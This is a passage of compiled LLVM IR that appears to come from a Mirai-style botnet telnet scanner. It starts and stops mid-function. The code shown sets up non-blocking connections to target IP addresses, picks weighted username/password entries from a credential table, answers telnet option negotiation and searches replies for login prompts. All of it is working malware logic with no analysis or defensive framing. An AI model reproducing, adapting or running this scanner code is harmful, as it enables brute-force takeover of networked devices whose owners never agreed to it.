2315:                                             ; preds = %2311, %2307, %2299, %2291, %2279, %2271, %2263, %2255, %2243, %2231, %2219, %2207, %2195, %2183, %2167, %2151, %2135, %2123, %2115, %2103, %2091, %2079, %2067, %2055, %2043, %2031, %2019, %2003, %1987, %1971, %1955, %1939, %1923, %1907, %1891, %1875, %1859, %1843, %1827, %1811, %1795, %1779, %1763, %1747, %1731, %1723, %1715, %1707, %1699, %1691, %1683, %1675, %1667, %1659, %1651, %1643, %1635, %1627, %1619, %1611, %1603, %1595, %1579, %1563, %1547, %1531, %1515, %1499, %1483, %1467, %1451, %1435, %1419, %1403, %1395, %1387, %1371, %1355, %1339, %1323, %1307, %1291, %1275, %1259, %1243, %1227, %1211, %1195, %1179, %1163, %1147, %1131, %1115, %1099, %1083, %1067, %1051, %1043, %1035, %1027, %1019, %1011, %1003, %995, %987, %979, %971, %963, %955, %943, %931, %919, %907, %895, %883, %871, %859, %847, %835, %823, %811, %799, %787, %775, %763, %751, %739, %727, %715, %703, %691, %679, %667, %655, %643, %631, %619, %607, %595, %583, %571, %559, %547, %535, %523, %511, %499, %487, %475, %463, %455, %443, %431, %423, %415, %407, %399, %391, %383, %375, %367, %359, %351, %343, %335, %327, %319, %311, %303, %295, %287, %279, %271, %263, %255, %247, %239, %231, %223, %215, %207, %199, %191, %183, %175, %167, %159, %151, %143, %135, %127, %119, %111, %107, %103, %99, %95, %91, %87, %83, %79, %75, %71, %67, %63, %59, %55, %51, %47, %43, %39, %35, %31, %27, %23
  %2316 = phi i1 [ true, %2307 ], [ true, %2299 ], [ true, %2291 ], [ true, %2279 ], [ true, %2271 ], [ true, %2263 ], [ true, %2255 ], [ true, %2243 ], [ true, %2231 ], [ true, %2219 ], [ true, %2207 ], [ true, %2195 ], [ true, %2183 ], [ true, %2167 ], [ true, %2151 ], [ true, %2135 ], [ true, %2123 ], [ true, %2115 ], [ true, %2103 ], [ true, %2091 ], [ true, %2079 ], [ true, %2067 ], [ true, %2055 ], [ true, %2043 ], [ true, %2031 ], [ true, %2019 ], [ true, %2003 ], [ true, %1987 ], [ true, %1971 ], [ true, %1955 ], [ true, %1939 ], [ true, %1923 ], [ true, %1907 ], [ true, %1891 ], [ true, %1875 ], [ true, %1859 ], [ true, %1843 ], [ true, %1827 ], [ true, %1811 ], [ true, %1795 ], [ true, %1779 ], [ true, %1763 ], [ true, %1747 ], [ true, %1731 ], [ true, %1723 ], [ true, %1715 ], [ true, %1707 ], [ true, %1699 ], [ true, %1691 ], [ true, %1683 ], [ true, %1675 ], [ true, %1667 ], [ true, %1659 ], [ true, %1651 ], [ true, %1643 ], [ true, %1635 ], [ true, %1627 ], [ true, %1619 ], [ true, %1611 ], [ true, %1603 ], [ true, %1595 ], [ true, %1579 ], [ true, %1563 ], [ true, %1547 ], [ true, %1531 ], [ true, %1515 ], [ true, %1499 ], [ true, %1483 ], [ true, %1467 ], [ true, %1451 ], [ true, %1435 ], [ true, %1419 ], [ true, %1403 ], [ true, %1395 ], [ true, %1387 ], [ true, %1371 ], [ true, %1355 ], [ true, %1339 ], [ true, %1323 ], [ true, %1307 ], [ true, %1291 ], [ true, %1275 ], [ true, %1259 ], [ true, %1243 ], [ true, %1227 ], [ true, %1211 ], [ true, %1195 ], [ true, %1179 ], [ true, %1163 ], [ true, %1147 ], [ true, %1131 ], [ true, %1115 ], [ true, %1099 ], [ true, %1083 ], [ true, %1067 ], [ true, %1051 ], [ true, %1043 ], [ true, %1035 ], [ true, %1027 ], [ true, %1019 ], [ true, %1011 ], [ true, %1003 ], [ true, %995 ], [ true, %987 ], [ true, %979 ], [ true, %971 ], [ true, %963 ], [ true, %955 ], [ true, %943 ], [ true, %931 ], [ true, %919 ], [ true, %907 ], [ true, %895 ], [ true, %883 ], [ true, %871 ], [ true, %859 ], [ true, %847 ], [ true, %835 ], [ true, %823 ], [ true, %811 ], [ true, %799 ], [ true, %787 ], [ true, %775 ], [ true, %763 ], [ true, %751 ], [ true, %739 ], [ true, %727 ], [ true, %715 ], [ true, %703 ], [ true, %691 ], [ true, %679 ], [ true, %667 ], [ true, %655 ], [ true, %643 ], [ true, %631 ], [ true, %619 ], [ true, %607 ], [ true, %595 ], [ true, %583 ], [ true, %571 ], [ true, %559 ], [ true, %547 ], [ true, %535 ], [ true, %523 ], [ true, %511 ], [ true, %499 ], [ true, %487 ], [ true, %475 ], [ true, %463 ], [ true, %455 ], [ true, %443 ], [ true, %431 ], [ true, %423 ], [ true, %415 ], [ true, %407 ], [ true, %399 ], [ true, %391 ], [ true, %383 ], [ true, %375 ], [ true, %367 ], [ true, %359 ], [ true, %351 ], [ true, %343 ], [ true, %335 ], [ true, %327 ], [ true, %319 ], [ true, %311 ], [ true, %303 ], [ true, %295 ], [ true, %287 ], [ true, %279 ], [ true, %271 ], [ true, %263 ], [ true, %255 ], [ true, %247 ], [ true, %239 ], [ true, %231 ], [ true, %223 ], [ true, %215 ], [ true, %207 ], [ true, %199 ], [ true, %191 ], [ true, %183 ], [ true, %175 ], [ true, %167 ], [ true, %159 ], [ true, %151 ], [ true, %143 ], [ true, %135 ], [ true, %127 ], [ true, %119 ], [ true, %111 ], [ true, %107 ], [ true, %103 ], [ true, %99 ], [ true, %95 ], [ true, %91 ], [ true, %87 ], [ true, %83 ], [ true, %79 ], [ true, %75 ], [ true, %71 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ true, %31 ], [ true, %27 ], [ true, %23 ], [ %2314, %2311 ]
  br i1 %2316, label %6, label %2317, !llvm.loop !50

2317:                                             ; preds = %2315
  %2318 = load i8, i8* %2, align 1
  %2319 = zext i8 %2318 to i32
  %2320 = shl i32 %2319, 24
  %2321 = load i8, i8* %3, align 1
  %2322 = zext i8 %2321 to i32
  %2323 = shl i32 %2322, 16
  %2324 = or i32 %2320, %2323
  %2325 = load i8, i8* %4, align 1
  %2326 = zext i8 %2325 to i32
  %2327 = shl i32 %2326, 8
  %2328 = or i32 %2324, %2327
  %2329 = load i8, i8* %5, align 1
  %2330 = zext i8 %2329 to i32
  %2331 = shl i32 %2330, 0
  %2332 = or i32 %2328, %2331
  %2333 = call i32 @htonl(i32 noundef %2332) #8
  ret i32 %2333
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @setup_connection(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %5, i8 0, i64 16, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

10:                                               ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 noundef %13)
  br label %15

15:                                               ; preds = %10, %1
  %16 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %15
  br label %59

21:                                               ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i64 0, i64 0
  call void @util_zero(i8* noundef %26, i32 noundef 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 noundef %32, i32 noundef 3, i32 noundef 0)
  %34 = or i32 2048, %33
  %35 = call i32 (i32, i32, ...) @fcntl(i32 noundef %29, i32 noundef 4, i32 noundef %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 4
  %39 = load i32, i32* %38, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  store i32 %39, i32* %41, align 4
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 5
  %44 = load i16, i16* %43, align 8
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = load i32, i32* @fake_time, align 4
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 2
  store i32 %46, i32* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 3
  store i32 1, i32* %50, align 8
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 1
  %53 = load i32, i32* %52, align 8
  %54 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %55 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %55, %struct.sockaddr** %54, align 8
  %56 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %57 = load %struct.sockaddr*, %struct.sockaddr** %56, align 8
  %58 = call i32 @connect(i32 noundef %53, %struct.sockaddr* %57, i32 noundef 16)
  br label %59

59:                                               ; preds = %21, %20
  ret void
}

declare i32 @select(i32 noundef, %struct.fd_set.26* noundef, %struct.fd_set.26* noundef, %struct.fd_set.26* noundef, %struct.timeval.27* noundef) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

9:                                                ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %46

13:                                               ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  br label %43

25:                                               ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

36:                                               ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %47

41:                                               ; preds = %25
  br label %42

42:                                               ; preds = %41
  br label %43

43:                                               ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %2, align 4
  br label %9, !llvm.loop !51

46:                                               ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %47

47:                                               ; preds = %46, %36
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %48
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #6

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recv_strip_null(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 noundef %11, i8* noundef %12, i64 noundef %14, i32 noundef %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

21:                                               ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %42

25:                                               ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

33:                                               ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %33, %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add nsw i32 %40, 1
  store i32 %41, i32* %10, align 4
  br label %21, !llvm.loop !52

42:                                               ; preds = %21
  br label %43

43:                                               ; preds = %42, %4
  %44 = load i32, i32* %9, align 4
  ret i32 %44
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_iacs(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  store i8* %10, i8** %4, align 8
  br label %11

11:                                               ; preds = %136, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %137

17:                                               ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

22:                                               ; preds = %17
  br label %137

23:                                               ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %135

28:                                               ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* noundef %29, i8* noundef %30, i32 noundef 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

33:                                               ; preds = %28
  br label %137

34:                                               ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %45

40:                                               ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add nsw i32 %43, 2
  store i32 %44, i32* %3, align 4
  br label %11, !llvm.loop !53

45:                                               ; preds = %34
  %46 = load i8*, i8** %4, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  br i1 %50, label %51, label %81

51:                                               ; preds = %45
  %52 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %52, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.consume_iacs.tmp1, i32 0, i32 0), i64 3, i1 false)
  %53 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %53, i8* align 1 getelementptr inbounds ([9 x i8], [9 x i8]* @__const.consume_iacs.tmp2, i32 0, i32 0), i64 9, i1 false)
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = load i8*, i8** %4, align 8
  %56 = call signext i8 @can_consume(%struct.scanner_connection* noundef %54, i8* noundef %55, i32 noundef 2)
  %57 = icmp ne i8 %56, 0
  br i1 %57, label %59, label %58

58:                                               ; preds = %51
  br label %137

59:                                               ; preds = %51
  %60 = load i8*, i8** %4, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp ne i32 %63, 31
  br i1 %64, label %65, label %66

65:                                               ; preds = %59
  br label %82

66:                                               ; preds = %59
  %67 = load i8*, i8** %4, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 3
  store i8* %68, i8** %4, align 8
  %69 = load i32, i32* %3, align 4
  %70 = add nsw i32 %69, 3
  store i32 %70, i32* %3, align 4
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 8
  %74 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i64 0, i64 0
  %75 = call i64 @send(i32 noundef %73, i8* noundef %74, i64 noundef 3, i32 noundef 16384)
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i64 0, i64 0
  %80 = call i64 @send(i32 noundef %78, i8* noundef %79, i64 noundef 9, i32 noundef 16384)
  br label %133

81:                                               ; preds = %45
  br label %82

82:                                               ; preds = %81, %65
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = load i8*, i8** %4, align 8
  %85 = call signext i8 @can_consume(%struct.scanner_connection* noundef %83, i8* noundef %84, i32 noundef 2)
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %88, label %87

87:                                               ; preds = %82
  br label %137

88:                                               ; preds = %82
  store i32 0, i32* %5, align 4
  br label %89

89:                                               ; preds = %120, %88
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %90, 3
  br i1 %91, label %92, label %123

92:                                               ; preds = %89
  %93 = load i8*, i8** %4, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 253
  br i1 %99, label %100, label %105

100:                                              ; preds = %92
  %101 = load i8*, i8** %4, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  store i8 -4, i8* %104, align 1
  br label %119

105:                                              ; preds = %92
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 251
  br i1 %112, label %113, label %118

113:                                              ; preds = %105
  %114 = load i8*, i8** %4, align 8
  %115 = load i32, i32* %5, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %114, i64 %116
  store i8 -3, i8* %117, align 1
  br label %118

118:                                              ; preds = %113, %105
  br label %119

119:                                              ; preds = %118, %100
  br label %120

120:                                              ; preds = %119
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  br label %89, !llvm.loop !54

123:                                              ; preds = %89
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 1
  %126 = load i32, i32* %125, align 8
  %127 = load i8*, i8** %4, align 8
  %128 = call i64 @send(i32 noundef %126, i8* noundef %127, i64 noundef 3, i32 noundef 16384)
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 3
  store i8* %130, i8** %4, align 8
  %131 = load i32, i32* %3, align 4
  %132 = add nsw i32 %131, 3
  store i32 %132, i32* %3, align 4
  br label %133

133:                                              ; preds = %123, %66
  br label %134

134:                                              ; preds = %133
  br label %135

135:                                              ; preds = %134, %23
  br label %136

136:                                              ; preds = %135
  br label %11, !llvm.loop !53

137:                                              ; preds = %87, %58, %33, %22, %11
  %138 = load i32, i32* %3, align 4
  ret i32 %138
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

15:                                               ; preds = %67, %1
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %70

18:                                               ; preds = %15
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  br i1 %26, label %63, label %27

27:                                               ; preds = %18
  %28 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %28, i32 0, i32 7
  %30 = load i32, i32* %5, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %29, i64 0, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 62
  br i1 %35, label %63, label %36

36:                                               ; preds = %27
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %38 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %37, i32 0, i32 7
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i64 0, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 36
  br i1 %44, label %63, label %45

45:                                               ; preds = %36
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp eq i32 %52, 35
  br i1 %53, label %63, label %54

54:                                               ; preds = %45
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 7
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %56, i64 0, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = sext i8 %60 to i32
  %62 = icmp eq i32 %61, 37
  br i1 %62, label %63, label %66

63:                                               ; preds = %54, %45, %36, %27, %18
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %6, align 4
  br label %70

66:                                               ; preds = %54
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, -1
  store i32 %69, i32* %5, align 4
  br label %15, !llvm.loop !55

70:                                               ; preds = %63, %15
  %71 = load i32, i32* %6, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %107

73:                                               ; preds = %70
  call void @table_unlock_val(i8 noundef zeroext 26)
  call void @table_unlock_val(i8 noundef zeroext 27)
  %74 = call i8* @table_retrieve_val(i32 noundef 26, i32* noundef %8)
  store i8* %74, i8** %9, align 8
  %75 = call i8* @table_retrieve_val(i32 noundef 27, i32* noundef %8)
  store i8* %75, i8** %10, align 8
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 7
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %77, i64 0, i64 0
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 6
  %81 = load i32, i32* %80, align 4
  %82 = load i8*, i8** %9, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sub nsw i32 %83, 1
  %85 = call i32 @util_memsearch(i8* noundef %78, i32 noundef %81, i8* noundef %82, i32 noundef %84)
  %86 = icmp ne i32 %85, -1
  %87 = zext i1 %86 to i32
  store i32 %87, i32* %7, align 4
  br i1 %86, label %88, label %90

88:                                               ; preds = %73
  %89 = load i32, i32* %7, align 4
  store i32 %89, i32* %6, align 4
  br label %106

90:                                               ; preds = %73
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 7
  %93 = getelementptr inbounds [256 x i8], [256 x i8]* %92, i64 0, i64 0
